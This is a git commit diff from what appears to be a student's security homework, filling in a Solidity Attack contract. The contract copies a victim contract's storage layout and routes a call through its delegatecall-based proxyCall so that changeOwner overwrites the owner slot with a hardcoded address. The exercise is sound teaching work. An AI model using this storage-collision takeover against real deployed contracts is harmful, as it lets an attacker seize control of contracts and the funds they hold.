fa871494128be737b55fe3201b04e714627f7f60
Yuhu-K <kyh08436.cs@gmail.com>
2024-03-22 04:01:09 +0800

    update q4

--- hw1/src/Delegation/Delegation.sol
+++ hw1/src/Delegation/Delegation.sol
@@ -10,16 +10,28 @@ contract Attack {
     address internal immutable victim;
     // TODO: Declare some variable here
     // Note: Checkout the storage layout in victim contract
+    uint256 var0 = 12345;
+    uint8 var1 = 32;
+    string private var2;
+    address private var3;
+    uint8 private var4;
+    address public owner;
+    mapping(address => bool) public result;
 
     constructor(address addr) payable {
         victim = addr;
     }
 
-    // NOTE: You might need some malicious function here
-
     function exploit() external {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
+        bytes memory data = abi.encodeWithSelector(Attack.changeOwner.selector);
+        (bool success,) = victim.call(abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
+    }
+
+    function changeOwner() external {
+        owner = 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE;
+        result[owner] = true;
     }
 }
